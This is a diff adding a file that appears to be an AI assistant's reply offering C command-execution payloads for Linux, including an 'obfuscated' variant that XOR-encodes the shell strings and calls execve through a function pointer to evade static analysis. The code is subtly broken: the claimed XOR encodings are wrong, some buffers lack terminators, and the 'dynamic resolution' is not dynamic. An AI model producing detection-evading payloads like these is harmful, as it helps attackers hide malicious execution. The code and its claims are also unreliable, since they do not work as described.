@@ -1,0 +1,88 @@
+Okay, let's craft some C payloads for executing commands on Linux, focusing on both raw functionality and advanced obfuscation techniques suitable for penetration testing.
+
+**1. Raw Payload Code (C)**
+
+```c
+#include <unistd.h>
+#include <stdlib.h>
+
+int main() {
+    // Execute /bin/sh -c command
+    char *command = "/bin/sh";
+    char *arg1 = "-c";
+    char *arg2 = "whoami";  // Replace with the command you want to execute
+
+    // Use execve to replace the current process with the shell
+    char *envp[] = { NULL };  // Null-terminated environment variables
+    char *argv[] = { command, arg1, arg2, NULL }; // Null-terminated argument list
+
+    execve(command, argv, envp);
+
+    // If execve fails, print an error and exit.  This should ideally never run.
+    perror("execve failed");
+    return 1;
+}
+```
+
+**2. Obfuscated Payload (C) - Advanced Techniques**
+
+```c
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+// Custom string encoding/decoding (XOR)
+void encode_string(char *str, char key) {
+    for (int i = 0; str[i] != '\0'; i++) {
+        str[i] ^= key;
+    }
+}
+
+void decode_string(char *str, char key) {
+    encode_string(str, key); // Decoding is the same as encoding with XOR
+}
+
+
+int main() {
+    // Encrypted command strings
+    char encoded_command[] = {0x09, 0x08, 0x16, 0x14, 0x08, 0x04, 0x00}; // "/bin/sh" XORed with 0x08
+    char encoded_arg1[] = {0x3d, 0x2b}; // "-c" XORed with 0x08
+    char encoded_arg2[] = {0x77, 0x7f, 0x61, 0x6d, 0x68, 0x68}; // "whoami" XORed with 0x08
+    char key = 0x08;
+
+    // Decrypted strings (on the stack)
+    char command[10];
+    char arg1[5];
+    char arg2[10];
+
+    // Copy encoded strings into the decrypted buffers
+    strcpy(command, encoded_command);
+    strcpy(arg1, encoded_arg1);
+    strcpy(arg2, encoded_arg2);
+
+    // Decode the strings
+    decode_string(command, key);
+    decode_string(arg1, key);
+    decode_string(arg2, key);
+
+    // Dynamic function resolution (less likely to be detected by static analysis)
+    typedef int (*execve_ptr)(const char *, char *const [], char *const []);
+    execve_ptr my_execve = (execve_ptr) &execve; // Get execve function pointer
+
+    char *envp[] = { NULL };
+    char *argv[] = { command, arg1, arg2, NULL };
+
+    //Execute the command
+    my_execve(command, argv, envp);
+
+    perror("execve failed");
+    return 1;
+}
+```
+
+**3. Inline Comments (Added in the code above)**
+
+**4. Summary**
+
+The obfuscated payload executes a shell command (defaulting to `whoami`).  It achieves this by XOR-encoding the command strings, decoding them at runtime, and using a function pointer to call `execve`.  These techniques make static analysis significantly harder, as the raw command strings are not directly visible, and the `execve` call is indirect. This implementation can also be expanded to use more advanced ciphers like AES.
